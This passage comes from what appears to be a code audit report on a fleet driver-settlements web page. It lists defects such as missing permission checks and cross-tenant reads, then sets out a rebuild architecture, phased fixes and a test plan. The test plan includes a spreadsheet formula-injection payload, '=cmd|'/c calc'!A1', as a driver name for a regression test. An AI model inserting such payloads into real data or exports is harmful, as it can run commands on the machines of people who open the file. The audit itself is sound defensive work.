| H-10 | `openReconciledPeriod`'s success and error paths build the same 25-field object twice | [:737-846](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L737-L846) |
| H-11 | `Number(r.amountOwed) \|\| Math.abs(...)` — a legitimate `0` falls through to the fallback | [:348](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L348) |
| H-12 | `normalizePeriodRow` accepts `period_anchor`/`period_end` snake_case that the API never sends | [:214-220](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L214-L220) |
| H-13 | `buildCashCollectionTx` — the `workPeriodStart` branch assigns the identical value in both arms of its `if` | [driverSettlementTx.ts](apps/fleet/src/utils/driverSettlementTx.ts) |
| H-14 | `onPay={() => {}}` — a required prop stubbed out in the log-cash branch rather than made optional | [:1252](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L1252) |
| H-15 | `payOutstandingAmount` is a 3-line file wrapping `Math.max(0, Number(x) \|\| 0)` | [driverSettlementsPayAmount.ts](apps/fleet/src/utils/driverSettlementsPayAmount.ts) |
| H-16 | `settlementService.processFuelSettlement` — a documented no-op still exported and called | [settlementService.ts:425](apps/fleet/src/services/settlementService.ts#L425) |
| H-17 | The literal `0.005` epsilon appears 9 times on this page; `MONEY_EPS` is exported from finance-core and unused here | throughout |
| H-18 | `refreshAll()` invalidates six query keys by hand; no shared key factory | [:714-722](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L714-L722) |
| H-19 | `getSettlementPaidPeriods` / `GET /settlement-paid` exist and are called from nowhere in this desk | [api.ts:2599](apps/fleet/src/services/api.ts#L2599) |
| H-20 | `transactions.approve` and `transactions.reject` are declared in four permission files and **enforced nowhere in the codebase** | [permissions.ts:294-295](packages/auth-client/src/permissions.ts#L294-L295) |

---

## 6. The enterprise gap — capability matrix

What a fleet settlement desk needs, against what exists:

| Capability | Today | Gap |
|---|---|---|
| **Segregation of duties** | ✗ | One role does everything. `transactions.approve`/`reject` exist unused (H-20). |
| **Maker–checker on payouts** | ✗ | No approval step at any amount. |
| **Approval thresholds** | ✗ | A $50 and a $50,000 payout take identical clicks. |
| **Immutable audit trail** | ✗ | Undo hard-deletes (S1-2). |
| **Reason capture on reversal** | ✗ | Write-offs require a reason; reversals do not (S3-9). |
| **Idempotency** | ✗ | None on any settlement write (S1-4). |
| **Server-side invariants** | ✗ | All caps are client-side (S1-4, S1-5). |
| **Concurrency control** | ✗ | No versioning, no locks (S2-5, S2-6). |
| **Aging** | ✗ | No aging anywhere (S3-2). |
| **Driver-level rollup** | ✗ | Week rows only (S3-1). |
| **Payment run as an entity** | ✗ | Batch is a client for-loop (S2-6). |
| **Bank file export (ACH/RTGS)** | ✗ | CSV of the screen only. |
| **Payment provider integration** | ✗ | Everything is manually recorded after the fact. |
| **Remittance advice to driver** | ✗ | Driver sees a projection, never a statement. |
| **Dispute workflow** | ✗ | No mechanism on this desk. |
| **Notes / attachments per settlement** | ✗ | None (S3-8). |
| **Status timeline per week** | ✗ | None (S3-8). |
| **Period close / freeze** | Partial | Signed-week logic exists in the projection; not surfaced or enforced on the desk. |
| **Multi-currency** | ✗ | JMD hardcoded (`canonical_from_ops.ts:592`). |
| **Tenant isolation** | Partial | Broken on Reconciled (S1-3) and on delete (S1-2b). |
| **Service-line scoping** | Partial | Works on 1 of 5 queues (S1-6). |
| **Error visibility** | ✗ | Failures render as zeros (S3-5). |
| **Tests** | ✗ | None (S2-8). |
| **Settlement math** | ✓ | Sound — minor units, continuous, tested. Keep it. |

---

## 7. Proposed target architecture

The calculation core stays. Everything between it and the operator gets rebuilt.

### 7.1 Server: settlements become commands, not row writes

Replace three client-side transaction builders with an explicit command API:

```
POST   /settlements/collect        { driverId, weekAnchor, amount, method, reference?,
                                     idempotencyKey, expectedOutstanding }
POST   /settlements/pay            { driverId, weekAnchor, amount, method, reference?,
                                     idempotencyKey, expectedOutstanding }
POST   /settlements/write-off      { driverId, weekAnchor, amount, reason,
                                     idempotencyKey, expectedOutstanding }
POST   /settlements/reverse        { movementId, reason, idempotencyKey }
POST   /settlements/runs           { rows[], method, effectiveDate, idempotencyKey }  → runId
GET    /settlements/runs/:runId    → per-row status, retryable
POST   /settlements/:id/approve    { decision, note }
```

Each command, server-side and inside a transaction:
1. asserts permission (`settlements.collect` / `.pay` / `.write_off` / `.reverse` / `.approve`)
2. asserts org ownership of the target row
3. dedupes on `idempotencyKey`
4. locks the period row and re-derives the residual from `finance-core`
5. rejects on `expectedOutstanding` mismatch → `409 STALE_RESIDUAL` with the current value
6. enforces the caps (over-collection, over-payment) with an explicit override path
7. writes an **append-only movement** and bumps the period row version
8. returns the recomputed period row

Reversal never deletes. It posts an offsetting movement carrying `reversesMovementId`, `reason`, `actorId`.

### 7.2 Read model: one projection for all four tabs

Add `settlement_movements` (append-only: collected / paid / written-off / reversed / pending, each with actor, method, reference, reason, approval state) alongside `driver_financial_periods`. Every tab reads the projection; KV becomes an event store only. This closes S2-1, S1-9, and S1-10 structurally.

Serve one queue endpoint with server-side filter, sort, page, and aggregate:

```
GET /settlements/queue?view=collect|pay|reconciled&groupBy=driver|week
    &ageBucket=&serviceLine=&orgId=&search=&sort=&page=&pageSize=
→ { rows, totals, aggregates: { byAge, byDriver }, page: { total, hasMore } }
```

All amounts in **minor units**. `organizationId` mandatory and RLS-enforced, not hand-threaded.

### 7.3 Client: decompose the 2,342-line component

```
DriverSettlementsPage.tsx          (~150 lines — layout + mode routing only)
├── hooks/useSettlementQueue.ts    (one query, one key factory, server-driven)
├── hooks/useSettlementCommands.ts (mutations + idempotency keys + optimistic updates)
├── SettlementKpiBar.tsx           (one basis, documented, filter-aware)
├── SettlementFilters.tsx          (rendered ONCE — kills H-5)
├── SettlementQueueTable.tsx       (one table; driver rollup + week drill-down; virtualized)
├── MovementHistoryTable.tsx       (replaces DonePay + DoneCollect — kills H-8)
├── ApprovalQueue.tsx              (new — maker/checker)
└── ReconciledPeriodOverlay.tsx    (keep; add timeline + attachments)
```

### 7.4 UX model

Default view: **one row per driver**, sorted by oldest debt.

```
Driver              Owed      Oldest    Weeks  Aging (0-30│31-60│61-90│90+)   Actions
Kenny G. Rattray  $228,160    Jan 5      16    ▓▓░░░░│▓▓▓░░│▓▓░░░│▓▓▓▓▓      [Collect] [⋯]
  └ expand → the 16 week rows currently shown, each with its own status + history
```

Plus: a totals footer; "showing N of M · $X of $Y"; aging colour; explicit error states distinct from empty; an approval queue for payouts above threshold; per-week timeline and notes; export on every tab; remittance advice generation.

---

## 8. Phased implementation plan

Ordered so the two exploitable defects close first and nothing later depends on unfinished work.

### Phase 0 — Security hotfix (1–2 days) 🔴 do first
- **S1-1** add `requirePermission('transactions.edit')` to `POST /transactions` (or an explicit settlement-category gate)
- **S1-3** pass `organizationId` on `/reconciled` and `/settlement-paid`
- **S1-2b** assert org ownership in `DELETE /transactions/:id`
- **S1-12** neutralise CSV formula injection; quote all fields
- Regression tests for each — *these four are independently shippable and must not wait for the rebuild.*

### Phase 1 — Correctness patches (3–5 days, no architecture change)
- **S1-9** add `metadata` to the cash-held select; add a "mapper reads only selected columns" test
- **S1-7 / S1-8** fix both query keys
- **S1-5** cap Log Cash against `cashOwed`
- **S1-6** honour `serviceLine` on all queues, or remove it from those that ignore it
- **S3-5** render error states on all five queries
- **S1-11** put every KPI on one basis and label it

### Phase 2 — Safety net (5–7 days)
- Unit tests for every derived value on the page (KPI totals, filters, sorts, grouping, CSV)
- Integration tests per queue endpoint including org and service-line scoping
- E2E: collect, pay, write-off, verify, reverse, batch — happy path and each failure mode
- **Nothing in Phase 3+ starts before this is green.**

### Phase 3 — Immutable movements + command API (2 weeks) 🏗️
- `settlement_movements` table, append-only, with actor/reason/approval columns
- The five commands from §7.1: permission → org → idempotency → lock → invariant → append → version
- **S1-2a** replace hard delete with reversal; backfill tombstones for prior deletions where recoverable
- **S1-4** idempotency keys + `expectedOutstanding` optimistic concurrency
- **S1-10** filter Done/Awaiting on settlement week, not transaction date
- Retire the three client-side builders

### Phase 4 — Queue read model + server-side paging (1 week)
- One `/settlements/queue` endpoint: server filter/sort/page/aggregate, minor units, `totalCount` + `truncated`
- **S2-3** delete the 50k client pagination loop
- RLS on `driver_financial_periods` (after the org-column backfill from FIA §2.4)

### Phase 5 — Component decomposition (1 week)
- Split per §7.3; virtualize the table
- Clears H-5, H-6, H-7, H-8, H-9, H-10 as a side effect

### Phase 6 — Enterprise controls (1–2 weeks)
- Maker–checker with amount thresholds; `settlements.approve` wired to the existing unused permission
- `settlement_run` as a first-class entity with per-row outcomes and retry
- Aging buckets; driver-level rollup; totals footer
- Per-week timeline, notes, attachments
- Remittance advice; export on every tab; bank-file export format

### Phase 7 — Hygiene (2–3 days)
- Work §5 top to bottom
- Lint rule: `supabase/functions/**` may not import from `apps/**` (S2-7)
- Delete `DriverPayoutsPage.tsx` and the alias export

---

## 9. Test plan (what "done" means)

**Invariants** — property-based, against `finance-core`:
- `settlement_paid ≤ gross entitlement + tolerance` after any sequence of commands
- a movement and its reversal always net to zero on the projection
- replaying any command with the same `idempotencyKey` is a no-op
- `sum(displayed rows) == displayed total` for every filter combination

**Authorization** — one negative test per command per role, including:
- a `transactions.view`-only token cannot post a payout *(this test fails today)*
- an org-A token cannot read, delete, or reverse an org-B record *(fails today on delete and reconciled)*

**Concurrency**:
- two simultaneous pays on one week → exactly one succeeds, the other gets `409 STALE_RESIDUAL`
- a batch run holds its week locks; a competing single pay is rejected, not silently applied

**Data-shape**:
- every list query selects every column its mapper dereferences *(fails today on cash-held)*
- every React Query key contains every input that changes the response *(fails today on two keys)*

**UI**:
- a failed fetch renders an error, never `$0.00` *(fails today)*
- a driver named `=cmd|'/c calc'!A1` exports as an inert cell *(fails today)*
- the drill-down is reachable by keyboard *(fails today)*

---

## 10. Summary table

| ID | Severity | Finding | Effort |
|---|---|---|---|
| S1-1 | 🔴 Critical | Money-write endpoint enforces no role permission | S |
| S1-2 | 🔴 Critical | Undo hard-deletes; no org check; no audit record | M |
| S1-3 | 🔴 Critical | Reconciled tab not org-scoped — cross-tenant read | S |
| S1-4 | 🔴 Critical | No server invariants, no idempotency — duplicate/over-pay | L |
| S1-5 | 🔴 High | Log Cash has no over-collection cap | S |
| S1-6 | 🟠 High | Service-line scope silently ignored on 4 of 5 reads | M |
| S1-7 | 🟠 High | Post-collection toast reports a fabricated balance | S |
| S1-8 | 🟠 Med | Reconciled query key omits `scope` | XS |
| S1-9 | 🟠 High | Cash-held rows can never show mismatch/overpaid | XS |
| S1-10 | 🟠 High | Done tab loses payments recorded outside the window | M |
| S1-11 | 🟡 Med | KPI row mixes bases and filter behaviour | S |
| S1-12 | 🟡 Med | CSV formula injection | XS |
| S2-1 | 🟠 Structural | Two sources of truth in one tab strip | L |
| S2-2 | 🟠 Structural | Money transactions authored client-side | L |
| S2-3 | 🟠 Structural | 50k-row client pagination, no virtualization | M |
| S2-4 | 🟡 Structural | Floats in UI over a minor-unit core | M |
| S2-5 | 🟠 Structural | No optimistic concurrency on the money row | M |
| S2-6 | 🟠 Structural | No locking during a pay run | M |
| S2-7 | 🟡 Structural | Edge functions import from `apps/fleet/src` | S |
| S2-8 | 🔴 Structural | Zero tests on the entire section | L |
| S2-9 | 🟡 Structural | Selection not reconciled against server truth | S |
| S3-1…12 | 🟡 UX | No rollup, no aging, no totals, errors as zeros, a11y | L |
| S4 / H-1…20 | 🟢 Hygiene | 20 redundancies, dead branches, duplicated blocks | M |

**Not broken — keep as is**: `packages/finance-core` settlement math, the minor-unit path, `driver_financial_periods` as a read model, the ADR-0010 decision to keep "Driver owes" and "Cash held" as separate KPIs, and the toll/fuel wash handling.

---

*Audit only. No source files were modified.*
